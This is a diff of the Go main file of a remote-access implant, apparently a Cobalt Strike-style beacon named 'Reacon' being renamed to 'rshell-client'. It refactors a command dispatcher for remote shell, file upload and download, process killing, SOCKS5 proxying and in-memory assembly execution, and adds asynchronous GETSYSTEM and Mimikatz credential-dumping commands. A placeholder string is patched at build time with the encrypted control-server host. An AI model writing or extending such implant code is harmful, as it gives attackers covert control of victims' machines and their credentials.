@@ -2,17 +2,22 @@ package main
 
 import (
 	"Reacon/pkg/communication"
-	"Reacon/pkg/config"
-	"Reacon/pkg/encrypt"
-	"Reacon/pkg/services"
+	"rshell-client/shared/config"
+	"rshell-client/shared/encrypt"
+	"rshell-client/shared/link"
+	"rshell-client/shared/services"
 	"encoding/binary"
-	"errors"
 	"fmt"
 	"os"
 	"sort"
 	"strings"
 	"time"
 )
+
+func init() {
+	link.ReportError = communication.ErrorProcess
+	link.ReportData = communication.DataProcess
+}
 
 func process_client(name string) {
 	data := communication.Get(communication.Service, name)
@@ -36,88 +41,31 @@ func process_client(name string) {
 			if len(decrypted) < 4 {
 				return
 			}
-			cmdType := binary.BigEndian.Uint32(decrypted[:4])
-			cmdBuf := decrypted[4:]
-			if cmdBuf != nil {
-				var err error
-				var callbackType int
-				var result []byte
-				switch cmdType {
-				case services.SHELL: // shell
-					result, err = services.CmdShell(cmdBuf)
-					callbackType = 0
-				case services.UploadStart: //upload 第一次
-					result, err = services.CmdUpload(cmdBuf, true)
-					callbackType = 0
-				case services.UploadLoop: //upload 后续的upload
-					result, err = services.CmdUpload(cmdBuf, false)
-					callbackType = 0
-				case services.DOWNLOAD: //download   2
-					result, err = services.CmdDownload(cmdBuf)
-					callbackType = 0
-				case services.FileBrowse: //File Browser
-					result, err = services.CmdFileBrowse(cmdBuf)
-					callbackType = services.FileBrowse
-				case services.CD: //cd
-					result, err = services.CmdCd(cmdBuf)
-					callbackType = 0
-				case services.SLEEP: //sleep
-					result, err = services.CmdSleep(cmdBuf)
-					callbackType = 0
-				case services.PAUSE: //pause
-					result, err = services.CmdPause(cmdBuf)
-					callbackType = 0
-				case services.PWD: //pwd
-					result, err = services.CmdPwd()
-					callbackType = 0
-				case services.EXIT: //exit
-					result, err = services.CmdExit()
-					if err == nil {
-						os.Exit(1)
-					}
-					callbackType = 0
-				case services.EXECUTE: // windows 后台执行程序
-					result, err = services.CmdExecute(cmdBuf)
-					callbackType = 0
-				case services.PS: // ps 列出进程
-					result, err = services.CmdPs()
-					callbackType = services.PS
-				case services.KILL: //kill
-					result, err = services.CmdKill(cmdBuf)
-					callbackType = 0
-				case services.MKDIR: //mkdir
-					result, err = services.CmdMkdir(cmdBuf)
-					callbackType = 0
-				case services.DRIVES: //list drives  2
-					result, err = services.CmdDrives()
-					callbackType = services.DRIVES
-				case services.RM: //rm
-					result, err = services.CmdRm(cmdBuf)
-					callbackType = 0
-				case services.CP: //cp
-					result, err = services.CmdCp(cmdBuf)
-					callbackType = 0
-				case services.MV: //mv
-					result, err = services.CmdMv(cmdBuf)
-					callbackType = 0
-				case services.FileContent:
-					result, err = services.GetFileContent(cmdBuf)
-					callbackType = 0
-				case services.Scoks5Start:
-					result, err = services.SocksConnect(cmdBuf)
-					callbackType = 0
-				case services.Scoks5Close:
-					result, err = services.SocksClose()
-					callbackType = 0
-				case services.ExecuteAssembly:
-					result, err = services.Execute_Assembly(cmdBuf)
-					callbackType = 0
-				case services.InlineBin:
-					result, err = services.Inline_bin(cmdBuf)
-					callbackType = 0
-				default:
-					err = errors.New("not supported command")
+		cmdType := binary.BigEndian.Uint32(decrypted[:4])
+		cmdBuf := decrypted[4:]
+
+		if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
+			go func(ct uint32, cb []byte) {
+				result, callbackType, err := services.DispatchCommand(ct, cb)
+				if err != nil {
+					communication.ErrorProcess(err)
+				} else if callbackType >= 0 {
+					communication.DataProcess(callbackType, result)
 				}
+		}(cmdType, cmdBuf)
+		return
+		}
+
+		if cmdBuf != nil {
+						result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
+						if cmdType == services.EXIT && err == nil {
+							os.Exit(1)
+						}
+						if err != nil {
+							communication.ErrorProcess(err)
+						} else if callbackType >= 0 {
+							communication.DataProcess(callbackType, result)
+						}
 				// convert charset here
 				if err != nil {
 					communication.ErrorProcess(err)
@@ -186,8 +134,8 @@ func main() {
 	encryptedHost := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 	encryptedHost = strings.ReplaceAll(encryptedHost, " ", "")
 	tmp1, _ := encrypt.DecodeBase64([]byte(encryptedHost))
-	tmp2, _ := encrypt.Decrypt(tmp1)
+	tmp2, _ := encrypt.DecryptNormal(tmp1)
 	host := string(tmp2)
-
+	encrypt.GenerateKeyPair()
 	Run_main(host)
 }
